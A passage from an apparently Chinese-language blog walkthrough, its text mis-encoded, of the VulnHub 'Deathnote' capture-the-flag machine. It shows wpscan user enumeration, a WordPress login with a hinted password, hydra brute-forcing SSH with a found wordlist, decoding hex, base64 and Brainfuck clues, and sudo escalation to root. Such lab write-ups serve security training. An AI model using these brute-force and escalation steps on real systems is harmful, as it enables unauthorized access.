<p>ç™»å½•ç”¨æˆ·åï¼š<code>user.txt</code><br>æˆ‘ä¸çŸ¥é“å¯†ç ã€‚<br>è‡ªå·±æ‰¾<br>ä½†æˆ‘è®¤ä¸ºå®ƒåœ¨ç½‘ç«™çš„æç¤ºéƒ¨åˆ†<br>#<code>user.txt</code>çœ‹æ¥éœ€è¦åŒæ ·è®¿é—®æ‰¾ä¸€ä¸‹<br>#æç¤ºéƒ¨åˆ†æœ‰å¯†ç ï¼Œçœ‹æ¥å°±æ˜¯<code>notes.txt</code>æ–‡æœ¬é‡Œäº†</p>
</blockquote>
<p>é‚£åé¢å°±æ˜¯æ‰¾ä¸€ä¸‹è¿™ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶åœ¨å“ªé‡Œäº†</p>
<h2><span id="1wpscan">1.wpscan</span></h2><p>æ—¢ç„¶ä¿¡æ¯ä¸å¤Ÿï¼Œé‚£æˆ‘ä»¬å°±ç”¨å¯¹åº”çš„<code>CMS</code>å·¥å…·ã€<code>wpscan</code>ã€‘æ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä¿¡æ¯</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>deathnote.vuln/wordpress -e u</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108204728050.png" alt="image-20221108204728050"></p>
<p>å‘ç°<code>kira</code>æ‰æ˜¯çœŸæ­£çš„åå°ç”¨æˆ·ï¼Œé‚£ä¹ˆ<code>ryuk</code>å¯èƒ½å°±æ˜¯<code>ssh</code>çš„ç™»å½•ç”¨æˆ·ï¼Œé‚£ä»–çš„å¯†ç æ˜¯å¤šå°‘å‘¢</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘æƒ³èµ·ä»–çš„ç•™è¨€</p>
<blockquote>
<p>my fav line is <code>iamjustic3</code></p>
<p>L on i will eliminate you L!</p>
</blockquote>
<p>ä»–è¯´ä»–æœ€å–œæ¬¢çš„å°è¯æ˜¯<code>iamjustic3</code></p>
<p>æ—¢ç„¶æ˜¯æœ€å–œæ¬¢çš„ï¼Œé‚£æœ€æœ‰å¯èƒ½æ‹¿æ¥å½“å¯†ç ã€‚æ‰€ä»¥è¿™ä¸ªå¯èƒ½å°±æ˜¯<code>kira</code>çš„åå°ç½‘ç«™çš„ç™»é™†å¯†ç </p>
<h3><span id="ç™»å½•åå°">ç™»å½•åå°</span></h3><blockquote>
<p><code>kira</code><br><code>iamjustic3</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108205228054.png" alt="image-20221108205228054"></p>
<p>ç™»å½•æˆåŠŸ</p>
<p>è¿™ä¸ªé¡µé¢æé†’éœ€è¦ç®¡ç†å‘˜é‚®ç®±éªŒè¯ï¼Œç›´æ¥<code>remind me later</code>ï¼Œæˆ‘ä»¬å…ˆåˆ°åå°çœ‹çœ‹</p>
<p>è¿›æ¥åå°å‘ç°<code>comments</code>é¡µé¢ï¼Œå…ˆçœ‹çœ‹èƒ½ä¸èƒ½çœ‹åˆ°<code>L</code>çš„è¯„è®º</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108205526638.png" alt="image-20221108205526638"></p>
<p>å‘ç°åŒæ ·å•¥ä¹Ÿæ²¡æœ‰</p>
<h2><span id="2sshç™»å½•">2.sshç™»å½•</span></h2><p>æˆ‘ä»¬å†çœ‹çœ‹å…¶ä»–é¡µé¢</p>
<p>åœ¨<code>Media</code>é¡µé¢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108211543340.png" alt="image-20221108211543340"></p>
<p>æˆ‘ä»¬å‘ç°äº†<code>notes.txt</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108211618643.png" alt="image-20221108211618643"></p>
<p>ç‚¹å¼€å¾—åˆ°<code>notes.txt</code>æ–‡æœ¬çš„ä½ç½®</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-content<span class="regexp">/uploads/</span><span class="number">2021</span><span class="regexp">/07/</span>notes.txt</span><br></pre></td></tr></table></figure>

<p>è®¿é—®å¾—åˆ°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108211705028.png" alt="image-20221108211705028"></p>
<p>çœ‹èµ·æ¥å¾ˆåƒå¯†ç æœ¬</p>
<blockquote>
<p><code>death4</code><br><code>death4life</code><br><code>death4u</code><br><code>death4ever</code><br><code>death4all</code><br><code>death420</code><br><code>death45</code><br><code>death4love</code><br><code>death49</code><br><code>death48</code><br><code>death456</code><br><code>death4014</code><br><code>1death4u</code><br><code>yaydeath44</code><br><code>thedeath4u2</code><br><code>thedeath4u</code><br><code>stickdeath420</code><br><code>reddeath44</code><br><code>megadeath44</code><br><code>megadeath4</code><br><code>killdeath405</code><br><code>hot2death4sho</code><br><code>death4south</code><br><code>death4now</code><br><code>death4l0ve</code><br><code>death4free</code><br><code>death4elmo</code><br><code>death4blood</code><br><code>death499Eyes301</code><br><code>death498</code><br><code>death4859</code><br><code>death47</code><br><code>death4545</code><br><code>death445</code><br><code>death444</code><br><code>death4387n</code><br><code>death4332387</code><br><code>death42521439</code><br><code>death42</code><br><code>death4138</code><br><code>death411</code><br><code>death405</code><br><code>death4me</code></p>
</blockquote>
<p>æˆ‘ä»¬è¯•è¯•çˆ†ç ´<code>ssh</code></p>
<p>æˆ‘ä»¬å†å¼„ä¸ªç”¨æˆ·åæœ¬</p>
<blockquote>
<p>å°±æ‹¿æˆ‘ä»¬å·²çŸ¥çš„ä¸‰ä¸ªç”¨æˆ·ï¼Œåšæˆç”¨æˆ·åæœ¬<br><code>kira</code><br><code>l</code><br><code>ryku</code></p>
</blockquote>
<p>ç„¶åä¹å¤´è›‡çˆ†ç ´ç™»å½•<code>ssh</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L un.txt -P pass.txt <span class="number">192.168.163.123</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108213915226.png" alt="image-20221108213915226"></p>
<p>å‘ç°ç™»å½•ç”¨æˆ·ã€çœ‹æ¥ç”¨ä¸ä¸Šå»æ‰¾é‚£ä¸ª<code>user.txt</code>ã€‘</p>
<blockquote>
<p><code>l</code><br><code>death4me</code></p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬è¯•è¯•ç™»å½•</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> l@<span class="number">192.168.16.123</span> </span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108214049547.png" alt="image-20221108214049547"></p>
<p>ç™»å½•æˆåŠŸï¼Œå¹¶çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶<code>user.txt</code>ã€æ— å¥ˆï¼Œç°åœ¨æ‰¾åˆ°åº”è¯¥ä¹Ÿæ²¡å•¥ç”¨äº†ã€‘</p>
<p>æŸ¥çœ‹ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108214257074.png" alt="image-20221108214257074"></p>
<p>å‘ç°æ˜¯ä¸²çœ‹ä¸æ‡‚çš„æ–‡æœ¬</p>
<p>æˆ‘ä»¬è¯•è¯•<code>ciphey</code>è§£å¯†ä¸€ä¸‹</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">ciphey</span> <span class="literal">-</span><span class="comment">t &quot;</span><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">--------------</span><span class="string">.</span><span class="literal">++++++++</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++++++</span><span class="string">.</span><span class="literal">-----------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span><span class="literal">+++++++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">++++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span>&gt;&gt;<span class="literal">----------</span><span class="string">.</span><span class="literal">+++++++++++++++++++</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++</span><span class="string">.</span><span class="literal">----------</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">++++++++++</span><span class="string">.</span><span class="literal">-------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++++++</span><span class="string">.</span><span class="literal">-----</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">+++++++++++++</span><span class="string">.</span>&gt;&gt;<span class="literal">++++++</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++++++++</span><span class="string">.</span><span class="literal">-----------------</span><span class="string">.</span></span><br><span class="line"><span class="comment">&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108221734407.png" alt="image-20221108221734407"></p>
<blockquote>
<p><code>i think u got the shell , but you wont be able to kill me -kira</code><br>æ„æ€æ˜¯ï¼š<br>æˆ‘æƒ³ä½ å·²ç»æ‹¿åˆ°shelläº†ï¼Œä½†ä½ æ€ä¸äº†æˆ‘-åŸºæ‹‰</p>
</blockquote>
<p>æ„Ÿè§‰ä¿¡æ¯æ²¡å•¥ç”¨ï¼Œä½†æ˜¯å¤§æ¦‚çŒœæµ‹ï¼Œæ€æ­»åŸºæ‹‰æ˜¯éœ€è¦ææƒçš„ï¼Œä½†æ˜¯ä»Lè¿™é‡Œæ˜¯æ— æ³•ææƒï¼Œåªæœ‰åŸºæ‹‰æ‰å¯ä»¥ææƒ</p>
<p>æˆ‘ä»¬å¯ä»¥è¯•è¯•æˆ‘ä»¬èƒ½å¦ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä¸€äº›å‘½ä»¤</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108222201419.png" alt="image-20221108222201419"></p>
<p> è¿™æ ·çœ‹æ¥<code>L</code>æ˜¯æ— æ³•ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œé‚£å°±åªæœ‰çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–è·¯å¾„äº†</p>
<p>æˆ‘ä»¬å†è¾“å…¥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹æˆ‘ä»¬å½“å‰è·¯å¾„</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108214344792.png" alt="image-20221108214344792"></p>
<p>å‘ç°æˆ‘ä»¬è¿˜æœ‰ä¸ªä¸Šçº§ç›®å½•ï¼Œè¿”å›æŸ¥çœ‹å…¶ä¸‹ç›®å½•</p>
<p>å±…ç„¶è¿˜æœ‰ä¸ª<code>kira</code>çš„ç›®å½•</p>
<p>æˆ‘ä»¬çœ‹çœ‹æœ‰ä»€ä¹ˆ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108214506480.png" alt="image-20221108214506480"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108214544456.png" alt="image-20221108214544456"></p>
<p>å‘ç°å…¶ç›®å½•ä¸‹çš„<code>kira.txt</code>è®¾ç½®äº†æƒé™</p>
<p>æˆ‘ä»¬å°è¯•ç”¨ä¹‹å‰åå°ç™»å½•çš„å¯†ç ç™»å½•ï¼Œä¹Ÿå¤±è´¥äº†</p>
<h2><span id="3ç™»å½•kira">3.ç™»å½•kira</span></h2><p>çœ‹æ¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾æ‰¾ä¿¡æ¯ï¼Œæ ¹æ®<code>user.txt</code>æ–‡æœ¬ä¿¡æ¯ï¼Œæˆ‘ä»¬å¿…é¡»è¦æˆåŠŸç™»å½•<code>kira</code>çš„ç”¨æˆ·ï¼Œæ‰å¯ä»¥ææƒæ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿</p>
<p>é‚£æˆ‘ä»¬ç›´æ¥æœç´¢å½“å‰å…¨éƒ¨å«æœ‰kiraçš„æ–‡ä»¶æˆ–è€…ç›®å½•</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;kira*&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108222721847.png" alt="image-20221108222721847"></p>
<p>å‰ä¸¤ä¸ªå‰é¢è®¿é—®è¿‡æ²¡æƒé™</p>
<p>åé¢å››ä¸ªä¸‰ä¸ªå›¾ç‰‡ï¼Œæœ€åä¸€ä¸ªä¹Ÿè®¿é—®è¿‡ï¼Œä¹Ÿæ²¡æƒé™</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108222833431.png" alt="image-20221108222833431"></p>
<p>é‚£å°±åªæœ‰ä¸€ä¸ªäº†</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>L/kira-<span class="keyword">case</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æœ‰æ— ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108223018151.png" alt="image-20221108223018151"></p>
<p>å‘ç°å…¶ä¸ºä¸€ä¸ªç›®å½•ï¼Œä¸”å…¶ä¸‹æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</p>
<blockquote>
<p><code>the FBI agent died on December 27, 2006</code></p>
<p><code>1 week after the investigation of the task-force member/head.</code><br><code>aka.....</code><br><code>Soichiro Yagami&#39;s family .</code></p>
<p><code>hmmmmmmmmm......</code><br><code>and according to watari ,</code><br><code>he died as other died after Kira targeted them .</code></p>
<p><code>and we also found something in</code><br><code>fake-notebook-rule folder .</code><br>æ„æ€æ˜¯ï¼š</p>
<p>è”é‚¦è°ƒæŸ¥å±€ç‰¹å·¥äº 2006 å¹´ 12 æœˆ 27 æ—¥å»ä¸–</p>
<p>å·¥ä½œç»„æˆå‘˜&#x2F;è´Ÿè´£äººè°ƒæŸ¥å 1 å‘¨ã€‚<br>åˆåâ€¦â€¦<br>å…«ç¥å®—ä¸€éƒçš„å®¶äººã€‚</p>
<p>å—¯å—¯å—¯å—¯â€¦â€¦<br>æ ¹æ® Watari çš„è¯´æ³•ï¼Œ<br>åœ¨åŸºæ‹‰ç„å‡†ä»–ä»¬ä¹‹åï¼Œä»–æ­»äº†ï¼Œå…¶ä»–äººä¹Ÿæ­»äº†ã€‚</p>
<p>æˆ‘ä»¬è¿˜å‘ç°äº†ä¸€äº›ä¸œè¥¿<br>å‡ç¬”è®°æœ¬è§„åˆ™æ–‡ä»¶å¤¹</p>
</blockquote>
<p>çœ‹æ¥æˆ‘ä»¬éœ€è¦åˆ°<code>fake-notebook-rule</code>è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯»æ‰¾ä¸€ç•ª</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;fake-notebook-rule&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾æ‰¾ä½ç½®</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108223338919.png" alt="image-20221108223338919"></p>
<p>å‘ç°åœ¨</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>L/fake-notebook-rule</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å…¶ä¸‹æ–‡ä»¶ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108223431583.png" alt="image-20221108223431583"></p>
<p>å¤§æ¦‚æ„æ€çœ‹æ¥å°±æ˜¯è®©æˆ‘ä»¬ç”¨<code>cyberchef</code>å¯¹<code>case.wav</code>çš„å­—ç¬¦ä¸²è§£å¯†ã€ä¸€çœ¼<code>16</code>è¿›åˆ¶ï¼Œç›´æ¥æ‰‹åŠ¨è§£ç ç®—äº†ã€‘</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">63</span> <span class="number">47</span> <span class="number">46</span> <span class="number">7</span>a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> <span class="number">6</span>b <span class="number">49</span> <span class="number">44</span> <span class="number">6</span>f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> <span class="number">6</span>c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> <span class="number">6</span>c <span class="number">7</span>a <span class="number">5</span>a <span class="number">58</span> <span class="number">5</span>a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> <span class="number">3</span>d</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è§£ç è¯•è¯•</p>
<p>è§£<code>16</code>è¿›åˆ¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108223720859.png" alt="image-20221108223720859"></p>
<p>è§£ç <code>base64</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108223847293.png" alt="image-20221108223847293"></p>
<blockquote>
<p>passwd : <code>kiraisevil</code> </p>
</blockquote>
<p>å¾—åˆ°<code>kira</code>å¯†ç </p>
<p>æˆ‘ä»¬ç›´æ¥ç™»å½•</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su kira</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108223953100.png" alt="image-20221108223953100"></p>
<p> ç™»å½•æˆåŠŸ</p>
<h2><span id="4ææƒ">4.ææƒ</span></h2><p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>kira</code>èƒ½ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå“ªäº›å‘½ä»¤</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108224111044.png" alt="image-20221108224111044"></p>
<p>å¥½å®¶ä¼™</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">ALL</span> : <span class="type">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>ä»£è¡¨ä»–å¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä¸€åˆ‡å‘½ä»¤ï¼Œé‚£ä»–å°±ç›¸å½“äºç®¡ç†å‘˜äº†</p>
<p>æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo su</span> </span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108224357240.png" alt="image-20221108224357240"></p>
<p>ç›´æ¥æ— å¯†ç è¿›å…¥ç®¡ç†å‘˜ç”¨æˆ·</p>
<p>ç„¶åæŸ¥çœ‹åˆ°æ ¹ç›®å½•æŸ¥çœ‹<code>flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108224501582.png" alt="image-20221108224501582"></p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: </span><br><span class="line">    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: </span><br><span class="line">   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         </span><br><span class="line">  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   </span><br><span class="line"> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    </span><br><span class="line">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span><br><span class="line">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span><br><span class="line"></span><br><span class="line">##########follow me on twitter###########<span class="number">3</span></span><br><span class="line">and share this screen shot and tag @KDSAMF</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>æ¸¸æˆç»“æŸ</strong></p>
<hr>
<h2><span id="psé¶æœºå½©è›‹">p.s.é¶æœºå½©è›‹</span></h2><p>ä¹‹å‰æˆ‘ä»¬ä»¥<code>L</code>çš„èº«ä»½æŸ¥çœ‹<code>kira</code>ï¼Œå‘ç°ä»–åº•ä¸‹æœ‰ä¸ª<code>kira.txt</code>æ–‡æœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬æ— æƒè®¿é—®</p>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108224728118.png" alt="image-20221108224728118"></p>
<p>å‘ç°æ˜¯ä¸€ä¸²<code>base64</code>åŠ ç å­—ç¬¦</p>
<p>è§£ç çœ‹çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108224803164.png" alt="image-20221108224803164"></p>
<blockquote>
<p><code>please protect one of the following</code> </p>
<ol>
<li><p><code>L (/opt)</code></p>
</li>
<li><p><code>Misa (/var)</code></p>
</li>
</ol>
<p>  åªèƒ½é€‰å…¶ä¸€æ¥ä¿æŠ¤</p>
</blockquote>
<p><code>/opt</code>åº•ä¸‹çš„<code>L</code>ï¼Œæˆ‘ä»¬å·²ç»çœ‹è¿‡äº†</p>
<p>æˆ‘ä»¬çœ‹çœ‹<code>/var</code>ä¸‹çš„<code>Misa</code>æœ‰ä»€ä¹ˆ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108225235107.png" alt="image-20221108225235107"></p>
<blockquote>
<p><code>it is toooo late for misa</code><br>#å¯¹ç±³æ²™è€Œè¨€ï¼Œå·²ç»å¤ªè¿Ÿäº†</p>
</blockquote>
<p>æ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥å»çœ‹çœ‹<code>DEATH NOTE</code></p>
<hr>
<h1><span id="äºŒ-matrix-breakout2-morpheusä¸­çº§">äºŒã€MATRIX-BREAKOUTï¼š2 MORPHEUS[ä¸­çº§]</span></h1><p><strong>ã€ŠçŸ©é˜µçªç ´ã€‹:2 å¢¨è²æ–¯</strong></p>
<blockquote>
